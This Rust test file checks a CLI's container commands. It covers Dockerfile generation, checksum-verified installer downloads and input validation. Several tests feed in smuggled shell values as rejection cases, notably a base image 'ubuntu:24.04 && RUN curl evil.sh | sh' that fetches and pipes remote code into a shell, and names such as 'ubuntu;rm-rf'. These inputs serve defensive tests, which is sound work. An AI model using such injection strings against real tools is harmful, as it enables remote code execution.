//! Contract tests for `src/cli/container.rs` (cov-13).
//!
//! Pins observable CLI contracts for `container init/status/list/images/pull/
//! stop/run`: generated Dockerfile content, refusal-to-overwrite semantics,
//! base-image sanitization, and pre-runtime validation of user-supplied
//! references. Runtime-dependent paths use isolated fake engines or a
//! deliberately emptied PATH so behavior is deterministic on any machine.

pub mod common;

use common::*;
use std::fs;
use std::os::unix::fs::PermissionsExt;
use tempfile::TempDir;

/// A PATH containing no executables at all: `docker`/`podman` detection must
/// deterministically fail inside the spawned `omg` process.
fn no_runtime_path() -> String {
    static DIR: std::sync::OnceLock<TempDir> = std::sync::OnceLock::new();
    let dir = DIR.get_or_init(|| TempDir::new().expect("empty PATH dir"));
    dir.path()
        .to_str()
        .expect("tempdir path is utf8")
        .to_string()
}

// ---------------------------------------------------------------------------
// container init
// ---------------------------------------------------------------------------

/// Contract: `omg container init` in an empty project creates `Dockerfile.omg`
/// whose first line is `FROM ubuntu:24.04` (the documented default base) and
/// reports the chosen base image in its output.
#[test]
fn init_creates_dockerfile_with_default_base_in_empty_project() {
    let project = TestProject::new();

    let result = project.run(&["container", "init"]);

    result.assert_success();
    let dockerfile = project
        .read_file("Dockerfile.omg")
        .expect("init must create Dockerfile.omg");
    assert!(
        dockerfile.starts_with("FROM ubuntu:24.04\n"),
        "default base image must be ubuntu:24.04, got:\n{dockerfile}"
    );
    result.assert_stdout_contains("Base image: ubuntu:24.04");
    result.assert_stdout_contains("omg container build -f Dockerfile.omg -t myapp");
}

/// The default Dockerfile must stay relative to the build context. The
/// container manager rejects absolute recipe paths before invoking the engine.
#[test]
fn build_with_default_dockerfile_reaches_the_engine() {
    let project = TestProject::new();
    project.create_file("Dockerfile", "FROM scratch\n");

    let fake = TempDir::new().expect("fake container engine directory");
    let log = fake.path().join("argv.log");
    for name in ["docker", "podman"] {
        let executable = fake.path().join(name);
        fs::write(
            &executable,
            "#!/bin/sh\nprintf '%s\\n' \"$@\" >> \"$OMG_CONTAINER_LOG\"\n",
        )
        .expect("write fake container engine");
        let mut permissions = fs::metadata(&executable)
            .expect("fake engine metadata")
            .permissions();
        permissions.set_mode(0o755);
        fs::set_permissions(&executable, permissions).expect("make fake engine executable");
    }

    let path = format!(
        "{}:{}",
        fake.path().display(),
        std::env::var("PATH").unwrap_or_default()
    );
    let result = project.run_with_env(
        &["container", "build", "--tag", "omg-docs:latest"],
        &[
            ("PATH", path.as_str()),
            (
                "OMG_CONTAINER_LOG",
                log.to_str().expect("fake log path is UTF-8"),
            ),
        ],
    );
    result.assert_success();

    let args = fs::read_to_string(&log).expect("fake docker invocation");
    let lines: Vec<&str> = args.lines().collect();
    assert!(lines.len() >= 7, "incomplete fake docker argv: {args}");
    assert_eq!(
        &lines[lines.len() - 7..lines.len() - 1],
        ["build", "-f", "Dockerfile", "-t", "omg-docs:latest", "--",],
    );
    assert_eq!(
        lines.last(),
        Some(&project.path().to_str().expect("project UTF-8"))
    );
}

/// Contract: marker-only projects use honest distribution defaults for Node,
/// Go and Python, while Rust retains the documented stable toolchain recipe.
/// A marker must not invent a numeric version pin.
#[test]
fn init_detects_project_runtimes_into_dockerfile() {
    let project = TestProject::new();
    project.create_file("package.json", r#"{"name":"t"}"#);
    project.create_file("Cargo.toml", "[package]\nname = \"t\"\n");
    project.create_file("go.mod", "module t\n");
    project.create_file("requirements.txt", "requests==2.31.0\n");

    use sha2::Digest as _;
    let installer = b"#!/bin/sh\nprintf '%s\\n' \"$*\" > \"$OMG_INSTALLER_PAYLOAD\"\n";
    let digest = format!("{:x}", sha2::Sha256::digest(installer));
    let pin = format!("https://sh.rustup.rs={digest}");
    let result = project.run(&["container", "init", "--installer-digest", &pin]);
    result.assert_success();

    let dockerfile = project.read_file("Dockerfile.omg").expect("dockerfile");
    assert!(
        dockerfile.contains(&digest),
        "supplied installer checksum must appear in recipe: {dockerfile}"
    );
    for (runtime, package) in [
        ("node", "nodejs"),
        ("go", "golang-go"),
        ("python", "python3"),
    ] {
        assert!(
            dockerfile.contains(&format!(
                "# {runtime}: distribution default (no version pin)"
            )) && dockerfile.contains(&format!("apt-get install -y {package} &&")),
            "{runtime} must use a labelled distribution package:\n{dockerfile}"
        );
        result.assert_stdout_contains(&format!("{runtime}: distribution default (no version pin)"));
    }
    for invented_pin in [
        "ENV NODE_VERSION=",
        "ENV GO_VERSION=",
        "ENV PYTHON_VERSION=",
    ] {
        assert!(
            !dockerfile.contains(invented_pin),
            "marker-only project must not invent {invented_pin}:\n{dockerfile}"
        );
    }
    assert!(
        dockerfile.contains("# Install Rust") && dockerfile.contains("--default-toolchain stable"),
        "rust runtime block missing:\n{dockerfile}"
    );
    assert!(
        dockerfile.contains("sha256sum -c -"),
        "Rust installer must retain its checksum verification:\n{dockerfile}"
    );
    project.close_checked();
}

/// Explicit project pins survive CLI detection and become a real build guard,
/// even when the installation uses a distribution-default Python package.
#[test]
fn init_preserves_explicit_python_pin_and_emits_an_executable_version_guard() {
    let project = TestProject::new();
    project.create_file("requirements.txt", "requests==2.31.0\n");
    project.create_file(".python-version", "3.13.2\n");

    let result = project.run(&["container", "init"]);
    result.assert_success();
    result.assert_stdout_contains("python: 3.13.2");
    let dockerfile = project
        .read_file("Dockerfile.omg")
        .expect("Dockerfile created");
    assert!(dockerfile.contains("# Required Python version: 3.13.2"));
    assert!(!dockerfile.contains("ENV PYTHON_VERSION="));
    let guard = dockerfile
        .lines()
        .filter_map(|line| line.strip_prefix("RUN "))
        .find(|line| line.contains("OMG runtime version mismatch: python "))
        .expect("generated recipe must execute its Python version guard");
    let provider = TempDir::new().expect("private Python provider");
    let executable = provider.path().join("python3");
    for (version, accepted) in [("3.13.2", true), ("3.13.3", false)] {
        fs::write(
            &executable,
            format!("#!/bin/sh\nprintf '%s\\n' '{version}'\n"),
        )
        .expect("write private version provider");
        fs::set_permissions(&executable, fs::Permissions::from_mode(0o755))
            .expect("make private provider executable");
        let output = std::process::Command::new("/bin/sh")
            .args(["-c", guard])
            .env("PATH", provider.path())
            .current_dir(provider.path())
            .output()
            .expect("execute emitted Python guard");
        assert_eq!(
            output.status.success(),
            accepted,
            "requested 3.13.2, provider {version}: status={}, stderr={:?}",
            output.status,
            String::from_utf8_lossy(&output.stderr)
        );
    }
    provider.close().expect("remove private provider");
    project.close_checked();
}

/// An unfulfillable project pin is refused before Dockerfile creation or any
/// mutation of existing build-context ignore rules.
#[test]
fn init_refuses_unsupported_project_pins_before_writing_recipe_or_ignore_files() {
    for (pin_file, request, runtime) in [
        (".python-version", ">=3.13", "python"),
        (".node-version", "lts", "node"),
    ] {
        let project = TestProject::new();
        project.create_file(pin_file, request);
        let ignores = [
            ".dockerignore",
            "Dockerfile.omg.dockerignore",
            ".containerignore",
        ];
        let sentinel = "# user rules\n!.env\n!secrets.key\n";
        for ignore in ignores {
            project.create_file(ignore, sentinel);
        }

        let result = project.run(&["container", "init"]);
        result.assert_failure();
        result.assert_stderr_contains(
            "Cannot generate a container that satisfies project runtime requests",
        );
        result.assert_stderr_contains(runtime);
        assert!(!result.stdout.contains("Created Dockerfile.omg"));
        assert!(
            !project.path().join("Dockerfile.omg").exists(),
            "refused {pin_file} request {request:?} must not create a recipe"
        );
        for ignore in ignores {
            assert_eq!(
                fs::read(project.path().join(ignore)).expect("existing ignore file readable"),
                sentinel.as_bytes(),
                "refused {pin_file} request {request:?} must preserve {ignore}"
            );
        }
        project.close_checked();
    }
}

/// Contract: when `Dockerfile.omg` already exists, `init` fails with the
/// explicit "already exists" guidance and leaves the existing file byte-for-byte
/// untouched.
#[test]
fn init_refuses_to_overwrite_existing_dockerfile() {
    let project = TestProject::new();
    let sentinel = "# my handcrafted dockerfile\nFROM alpine:edge\n";
    project.create_file("Dockerfile.omg", sentinel);

    let result = project.run(&["container", "init"]);

    result.assert_failure();
    result.assert_stderr_contains("Dockerfile.omg already exists");
    assert_eq!(
        fs::read(project.path().join("Dockerfile.omg")).expect("existing file readable"),
        sentinel.as_bytes(),
        "a failed init must not modify the existing Dockerfile.omg"
    );
}

/// Contract: `--base <image>` overrides the default base image verbatim when it
/// is a safe reference (`alpine:3.19` selects the apk install branch).
#[test]
fn init_respects_custom_base_image() {
    let project = TestProject::new();

    let result = project.run(&["container", "init", "--base", "alpine:3.19"]);
    result.assert_success();

    let dockerfile = project.read_file("Dockerfile.omg").expect("dockerfile");
    assert!(
        dockerfile.starts_with("FROM alpine:3.19\n"),
        "custom base must be honored, got:\n{dockerfile}"
    );
    assert!(
        dockerfile.contains("apk add --no-cache"),
        "alpine base must select the apk install branch:\n{dockerfile}"
    );
}

/// Contract: an unsafe `--base` value is never written into the Dockerfile;
/// generation falls back to `ubuntu:24.04`.
#[test]
fn init_sanitizes_unsafe_base_image_to_default() {
    let project = TestProject::new();

    let result = project.run(&[
        "container",
        "init",
        "--base",
        "ubuntu:24.04 && RUN curl evil.sh | sh",
    ]);
    result.assert_success();

    let dockerfile = project.read_file("Dockerfile.omg").expect("dockerfile");
    assert!(
        dockerfile.starts_with("FROM ubuntu:24.04\n"),
        "unsafe base must fall back to ubuntu:24.04, got:\n{dockerfile}"
    );
    assert!(!dockerfile.contains("evil"), "injected payload leaked");
    assert!(
        dockerfile.contains("apt-get update"),
        "fallback base must select the debian/ubuntu install branch"
    );
}

// ---------------------------------------------------------------------------
// container status / list / images without a runtime
// ---------------------------------------------------------------------------

/// Contract: with no container runtime on PATH, `status` fails and names the
/// missing dependency plus the remedy.
#[test]
fn status_without_runtime_names_missing_dependency_and_remedy() {
    let project = TestProject::new();

    let result = project.run_with_env(
        &["container", "status"],
        &[("PATH", no_runtime_path().as_str())],
    );

    result.assert_failure();
    result.assert_stderr_contains(
        "No container runtime detected. Install Docker or Podman to use container features.",
    );
    assert!(
        result.stdout.trim().is_empty(),
        "unexpected stdout: {}",
        result.stdout
    );
}

/// Contract: `status` either reports the usable runtime or fails with the
/// concrete runtime/daemon error instead of presenting an empty status card.
#[test]
fn status_header_reports_detected_runtime() {
    let project = TestProject::new();

    let result = project.run(&["container", "status"]);

    if result.success {
        assert!(
            result.stdout.contains("Runtime: Podman") || result.stdout.contains("Runtime: Docker"),
            "successful status must name its runtime: {}",
            result.stdout
        );
        result.assert_stdout_contains("Container Status");
    } else {
        assert!(
            result.stderr.contains("No container runtime detected")
                || result.stderr.contains("Failed to list containers"),
            "failed status must name the runtime cause: {}",
            result.stderr
        );
        assert!(!result.stdout.contains("Container Status"));
    }
}

/// Contract: `list` and `images` require a runtime and fail with the exact
/// actionable error when none exists.
#[test]
fn list_and_images_fail_with_exact_error_without_runtime() {
    let project = TestProject::new();

    for cmd in ["list", "images"] {
        let result =
            project.run_with_env(&["container", cmd], &[("PATH", no_runtime_path().as_str())]);
        result.assert_failure();
        result.assert_stderr_contains("No container runtime found. Install Docker or Podman.");
    }
}

// ---------------------------------------------------------------------------
// Pre-runtime validation of user-supplied references
// ---------------------------------------------------------------------------

/// Contract: `pull` rejects image refs containing shell operators with the
/// exact "Invalid image name" error BEFORE any runtime lookup. Proven under a
/// stripped PATH: if validation ran after `ContainerManager::new()`, the error
/// would be the runtime-missing one instead. The valid control ref proves the
/// validator is not rejecting everything.
#[test]
fn pull_rejects_shell_operators_before_runtime_contact() {
    let project = TestProject::new();

    let bad = project.run_with_env(
        &["container", "pull", "ubuntu;rm-rf"],
        &[("PATH", no_runtime_path().as_str())],
    );
    bad.assert_failure();
    bad.assert_stderr_contains("Invalid image name");
    bad.assert_stdout_contains("Names must match the expected character allowlist");

    let good = project.run_with_env(
        &["container", "pull", "ubuntu:24.04"],
        &[("PATH", no_runtime_path().as_str())],
    );
    good.assert_failure();
    good.assert_stderr_contains("No container runtime found");
}

/// Contract: `stop` rejects container names containing `|` with the same
/// pre-runtime validation contract.
#[test]
fn stop_rejects_pipe_operator_before_runtime_contact() {
    let project = TestProject::new();

    let bad = project.run_with_env(
        &["container", "stop", "web|evil"],
        &[("PATH", no_runtime_path().as_str())],
    );
    bad.assert_failure();
    bad.assert_stderr_contains("Invalid container name");

    let good = project.run_with_env(
        &["container", "stop", "web-app_1"],
        &[("PATH", no_runtime_path().as_str())],
    );
    good.assert_failure();
    good.assert_stderr_contains("No container runtime found");
}

/// Contract: `run` rejects a `--name` value containing characters outside
/// `[A-Za-z0-9_-]` with the exact remedy text, before any runtime lookup
/// (proven under a stripped PATH).
#[test]
fn run_rejects_invalid_container_name_before_runtime_contact() {
    let project = TestProject::new();

    let result = project.run_with_env(
        &[
            "container",
            "run",
            "--name",
            "bad;name",
            "ubuntu:24.04",
            "--",
            "echo",
            "hi",
        ],
        &[("PATH", no_runtime_path().as_str())],
    );

    result.assert_failure();
    result.assert_stderr_contains("Invalid container name");
    result.assert_stdout_contains(
        "Container names must be alphanumeric with hyphens or underscores only",
    );
}

/// Contract: malformed `KEY=VALUE` entries passed to `run` are rejected with
/// the exact "expected KEY=VALUE" guidance instead of being silently dropped.
///
#[test]
fn run_reports_malformed_env_entry_with_exact_guidance() {
    let project = TestProject::new();

    let result = project.run(&[
        "container",
        "run",
        "--env",
        "MALFORMED_NO_SEPARATOR",
        "ubuntu:24.04",
        "--",
        "echo",
        "hi",
    ]);

    result.assert_failure();
    result.assert_stderr_contains("Invalid environment variable 'MALFORMED_NO_SEPARATOR'");
    result.assert_stderr_contains("expected KEY=VALUE");
}

#[test]
fn init_rejects_invalid_installer_digests_before_project_writes() {
    for (pins, expected) in [
        (
            vec!["https://sh.rustup.rs".to_string()],
            "expected URL=SHA256",
        ),
        (
            vec!["https://sh.rustup.rs=xyz".to_string()],
            "64 hexadecimal characters",
        ),
        (
            vec![
                format!("https://sh.rustup.rs={}", "a".repeat(64)),
                format!("https://sh.rustup.rs={}", "b".repeat(64)),
            ],
            "Duplicate installer digest",
        ),
        (
            vec![format!(
                "https://unused.invalid/installer={}",
                "a".repeat(64)
            )],
            "not required by this project",
        ),
    ] {
        let project = TestProject::new();
        project.create_file("Cargo.toml", "[package]\nname = \"t\"\n");
        let marker = fs::read(project.path().join("Cargo.toml")).expect("marker bytes");
        let mut args = vec!["container", "init"];
        for pin in &pins {
            args.extend(["--installer-digest", pin.as_str()]);
        }
        let result = project.run(&args);
        result.assert_failure();
        result.assert_stderr_contains(expected);
        assert!(!project.path().join("Dockerfile.omg").exists());
        assert!(!project.path().join(".dockerignore").exists());
        assert_eq!(
            fs::read(project.path().join("Cargo.toml")).expect("marker survives"),
            marker
        );
        project.close_checked();
    }
}

#[test]
fn init_generated_installer_chain_checks_bytes_before_execution() {
    use sha2::Digest as _;
    let project = TestProject::new();
    project.create_file("Cargo.toml", "[package]\nname = \"t\"\n");
    let installer = b"#!/bin/sh\nprintf '%s\\n' \"$*\" > \"$OMG_INSTALLER_PAYLOAD\"\n";
    let digest = format!("{:x}", sha2::Sha256::digest(installer));
    let pin = format!("https://sh.rustup.rs={}", digest.to_ascii_uppercase());
    let result = project.run(&["container", "init", "--installer-digest", &pin]);
    result.assert_success();
    let dockerfile = project
        .read_file("Dockerfile.omg")
        .expect("generated recipe");
    let start = dockerfile
        .find("RUN curl --proto")
        .expect("installer RUN command");
    let emitted = dockerfile[start..].split("\n\n").next().expect("RUN block");
    let fixture = TempDir::new().expect("private installer provider");
    let downloaded = fixture.path().join("downloaded.sh");
    let bytes = fixture.path().join("installer.bytes");
    let payload = fixture.path().join("payload.args");
    let download_path = downloaded.to_str().expect("UTF-8 private path");
    assert!(
        download_path
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || b"/._-".contains(&byte))
    );
    // Translate only the fixed Docker /tmp path into this private fixture.
    let chain = emitted
        .strip_prefix("RUN ")
        .expect("RUN prefix")
        .replace("/tmp/omg-rustup-init.sh", download_path);
    fs::write(&bytes, installer).expect("controlled installer bytes");
    let curl = fixture.path().join("curl");
    fs::write(&curl, "#!/bin/sh\nset -eu\n[ \"$#\" -eq 7 ]\n[ \"$1\" = --proto ]\n[ \"$2\" = '=https' ]\n[ \"$3\" = --tlsv1.2 ]\n[ \"$4\" = -sSf ]\n[ \"$5\" = -o ]\n[ \"$6\" = \"$OMG_PRIVATE_DOWNLOAD\" ]\n[ \"$7\" = https://sh.rustup.rs ]\ncat \"$OMG_INSTALLER_BYTES\" > \"$6\"\n").expect("curl fixture");
    fs::set_permissions(&curl, fs::Permissions::from_mode(0o755)).expect("executable provider");
    let run = || {
        std::process::Command::new("/bin/sh")
            .args(["-c", chain.as_str()])
            .current_dir(fixture.path())
            .env(
                "PATH",
                format!("{}:/usr/bin:/bin", fixture.path().display()),
            )
            .env("OMG_PRIVATE_DOWNLOAD", &downloaded)
            .env("OMG_INSTALLER_BYTES", &bytes)
            .env("OMG_INSTALLER_PAYLOAD", &payload)
            .output()
            .expect("execute emitted chain")
    };
    let positive = run();
    assert!(
        positive.status.success(),
        "{}",
        String::from_utf8_lossy(&positive.stderr)
    );
    assert_eq!(
        fs::read_to_string(&payload).expect("installer ran"),
        "-s -- -y --default-toolchain stable\n"
    );
    assert!(
        !downloaded.exists(),
        "successful chain cleans its private download"
    );
    fs::remove_file(&payload).expect("reset payload witness");
    fs::write(
        &bytes,
        b"#!/bin/sh\nprintf tampered > \"$OMG_INSTALLER_PAYLOAD\"\n",
    )
    .expect("changed installer bytes");
    let rejected = run();
    assert!(!rejected.status.success());
    assert!(String::from_utf8_lossy(&rejected.stdout).contains("FAILED"));
    assert!(
        !payload.exists(),
        "checksum failure must prevent installer execution"
    );
    assert!(
        downloaded.exists(),
        "changed bytes reached the real checksum check"
    );
    eprintln!(
        "[installer-chain-fixture] matching_bytes=executed changed_bytes=rejected checksum=real_sha256sum translated_path=private"
    );
    fixture.close().expect("checked private provider cleanup");
    project.close_checked();
}

// A local transport fixture: records CONNECT targets, returns 502, never forwards.
struct InstallerRefusalProxy {
    endpoint: String,
    stop: std::sync::Arc<std::sync::atomic::AtomicBool>,
    worker: Option<std::thread::JoinHandle<std::io::Result<Vec<String>>>>,
}

impl InstallerRefusalProxy {
    fn new() -> Self {
        use std::io::{Read as _, Write as _};
        let listener = std::net::TcpListener::bind((std::net::Ipv4Addr::LOCALHOST, 0))
            .expect("bind private installer refusal proxy");
        let endpoint = format!("http://{}", listener.local_addr().expect("proxy address"));
        listener.set_nonblocking(true).expect("nonblocking proxy");
        let stop = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
        let worker_stop = std::sync::Arc::clone(&stop);
        let worker = std::thread::spawn(move || {
            let mut requests = Vec::new();
            while !worker_stop.load(std::sync::atomic::Ordering::Acquire) {
                match listener.accept() {
                    Ok((mut stream, _)) => {
                        stream.set_read_timeout(Some(std::time::Duration::from_secs(2)))?;
                        stream.set_write_timeout(Some(std::time::Duration::from_secs(2)))?;
                        let mut header = Vec::new();
                        while !header.ends_with(b"\r\n\r\n") {
                            if header.len() >= 8192 {
                                return Err(std::io::Error::other(
                                    "proxy header exceeded fixture bound",
                                ));
                            }
                            let mut byte = [0];
                            stream.read_exact(&mut byte)?;
                            header.push(byte[0]);
                        }
                        let header = String::from_utf8(header).map_err(std::io::Error::other)?;
                        requests.push(header.lines().next().unwrap_or_default().to_string());
                        stream.write_all(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")?;
                    }
                    Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                        std::thread::sleep(std::time::Duration::from_millis(1));
                    }
                    Err(error) => return Err(error),
                }
            }
            Ok(requests)
        });
        Self {
            endpoint,
            stop,
            worker: Some(worker),
        }
    }

    fn run(&self, project: &TestProject, args: &[&str]) -> CommandResult {
        project.run_with_env(
            args,
            &[
                ("HTTPS_PROXY", &self.endpoint),
                ("https_proxy", &self.endpoint),
                ("HTTP_PROXY", &self.endpoint),
                ("http_proxy", &self.endpoint),
                ("ALL_PROXY", &self.endpoint),
                ("all_proxy", &self.endpoint),
                ("NO_PROXY", ""),
                ("no_proxy", ""),
                ("PATH", no_runtime_path().as_str()),
                ("OMG_TEST_COMMAND_TIMEOUT_SECS", "25"),
            ],
        )
    }

    fn finish(mut self) -> Vec<String> {
        self.stop.store(true, std::sync::atomic::Ordering::Release);
        self.worker
            .take()
            .expect("owned proxy worker")
            .join()
            .expect("proxy worker panicked")
            .expect("proxy fixture I/O failed")
    }
}

impl Drop for InstallerRefusalProxy {
    fn drop(&mut self) {
        self.stop.store(true, std::sync::atomic::Ordering::Release);
        if let Some(worker) = self.worker.take() {
            match worker.join() {
                Ok(Ok(_)) => {}
                Ok(Err(error)) => eprintln!("installer proxy cleanup I/O error: {error}"),
                Err(_) => eprintln!("installer proxy cleanup observed worker panic"),
            }
        }
    }
}

#[derive(Debug, PartialEq, Eq)]
struct InstallerFixtureFile {
    bytes: Vec<u8>,
    len: u64,
    mode: u32,
    device: u64,
    inode: u64,
    owner: u32,
    group: u32,
    links: u64,
    modified: (i64, i64),
    changed: (i64, i64),
}

fn installer_fixture_file(project: &TestProject, name: &str) -> InstallerFixtureFile {
    use std::os::unix::fs::MetadataExt as _;
    let path = project.path().join(name);
    let metadata = fs::symlink_metadata(&path).expect("fixture file metadata");
    assert!(
        metadata.is_file(),
        "fixture must remain a regular file: {name}"
    );
    InstallerFixtureFile {
        bytes: fs::read(path).expect("fixture file bytes"),
        len: metadata.len(),
        mode: metadata.mode(),
        device: metadata.dev(),
        inode: metadata.ino(),
        owner: metadata.uid(),
        group: metadata.gid(),
        links: metadata.nlink(),
        modified: (metadata.mtime(), metadata.mtime_nsec()),
        changed: (metadata.ctime(), metadata.ctime_nsec()),
    }
}

fn installer_fixture_members(project: &TestProject) -> Vec<std::ffi::OsString> {
    let mut names = fs::read_dir(project.path())
        .expect("private project membership")
        .map(|entry| entry.expect("private project entry").file_name())
        .collect::<Vec<_>>();
    names.sort();
    names
}

#[test]
fn init_repeatable_explicit_installer_pins_avoid_fetch_for_both_urls() {
    const NODE_PIN: &str = "https://deb.nodesource.com/setup_20.x=0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF";
    const RUST_PIN: &str =
        "https://sh.rustup.rs=FEDCBA9876543210FEDCBA9876543210FEDCBA9876543210FEDCBA9876543210";
    for pins in [[NODE_PIN, RUST_PIN], [RUST_PIN, NODE_PIN]] {
        let project = TestProject::new();
        project.create_file(".node-version", "20\n");
        project.create_file(
            "Cargo.toml",
            "[package]\nname = \"fixture\"\nversion = \"0.1.0\"\n",
        );
        let before_node = installer_fixture_file(&project, ".node-version");
        let before_cargo = installer_fixture_file(&project, "Cargo.toml");
        let proxy = InstallerRefusalProxy::new();
        let result = proxy.run(
            &project,
            &[
                "container",
                "init",
                "--installer-digest",
                pins[0],
                "--installer-digest",
                pins[1],
            ],
        );
        let requests = proxy.finish();
        result.assert_success();
        assert_eq!(result.exit_code, 0);
        assert_eq!(
            requests,
            Vec::<String>::new(),
            "all explicit pins must avoid installer requests"
        );
        result.assert_stdout_contains("Created Dockerfile.omg");
        result.assert_stdout_contains("node: 20");
        result.assert_stdout_contains("rust: stable");
        let recipe = project
            .read_file("Dockerfile.omg")
            .expect("generated recipe");
        assert!(recipe.starts_with("FROM ubuntu:24.04\n"));
        assert!(recipe.contains("ENV NODE_VERSION=20\n"));
        assert!(recipe.contains(
            "RUN curl -fsSL -o /tmp/nodesource-setup.sh https://deb.nodesource.com/setup_20.x \\\n"
        ));
        assert!(recipe.contains("    https://sh.rustup.rs \\\n"));
        assert!(recipe.contains("    && echo \"0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef  /tmp/nodesource-setup.sh\" | sha256sum -c - \\\n"));
        assert!(recipe.contains("    && echo \"fedcba9876543210fedcba9876543210fedcba9876543210fedcba9876543210  /tmp/omg-rustup-init.sh\" | sha256sum -c - \\\n"));
        assert_eq!(recipe.matches("sha256sum -c -").count(), 2);
        assert!(recipe.contains("--default-toolchain stable"));
        assert!(!recipe.contains("# WARNING: no pinned digest"));
        assert_eq!(
            installer_fixture_file(&project, ".node-version"),
            before_node
        );
        assert_eq!(installer_fixture_file(&project, "Cargo.toml"), before_cargo);
        eprintln!(
            "[installer-two-pin-fixture] supplied=2 requests=0 normalized_checksums=2 input_state=unchanged"
        );
        project.close_checked();
    }
}

#[test]
fn init_partial_installer_pins_fetch_only_missing_url_and_preserve_outputs_on_error() {
    for (supplied, missing, connect) in [
        (
            "https://sh.rustup.rs=FEDCBA9876543210FEDCBA9876543210FEDCBA9876543210FEDCBA9876543210",
            "https://deb.nodesource.com/setup_20.x",
            "CONNECT deb.nodesource.com:443 HTTP/1.1",
        ),
        (
            "https://deb.nodesource.com/setup_20.x=0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF",
            "https://sh.rustup.rs",
            "CONNECT sh.rustup.rs:443 HTTP/1.1",
        ),
    ] {
        let project = TestProject::new();
        project.create_file(".node-version", "20\n");
        project.create_file(
            "Cargo.toml",
            "[package]\nname = \"fixture\"\nversion = \"0.1.0\"\n",
        );
        for name in [
            ".dockerignore",
            "Dockerfile.omg.dockerignore",
            ".containerignore",
        ] {
            project.create_file(name, "# keep my build context rules\n!local-fixture.txt\n");
            fs::set_permissions(project.path().join(name), fs::Permissions::from_mode(0o640))
                .expect("private ignore permissions");
        }
        let names = [
            ".node-version",
            "Cargo.toml",
            ".dockerignore",
            "Dockerfile.omg.dockerignore",
            ".containerignore",
        ];
        let before = names.map(|name| installer_fixture_file(&project, name));
        let membership = installer_fixture_members(&project);
        let proxy = InstallerRefusalProxy::new();
        let result = proxy.run(
            &project,
            &["container", "init", "--installer-digest", supplied],
        );
        let requests = proxy.finish();
        result.assert_failure();
        assert_eq!(result.exit_code, 1);
        assert_eq!(
            requests,
            [connect],
            "fetch must target exactly the missing installer"
        );
        result.assert_stderr_contains(&format!("Failed to pin {missing} for verification"));
        result.assert_stderr_contains(&format!("Failed to fetch {missing} for digest pinning"));
        assert!(!result.stderr.contains("[test harness timeout]"));
        assert!(!result.stdout.contains("Created Dockerfile.omg"));
        assert!(!project.path().join("Dockerfile.omg").exists());
        assert_eq!(installer_fixture_members(&project), membership);
        assert_eq!(
            names.map(|name| installer_fixture_file(&project, name)),
            before
        );
        eprintln!(
            "[installer-partial-pin-fixture] missing={missing} requests=1 exit=1 project_state=unchanged"
        );
        project.close_checked();
    }
}
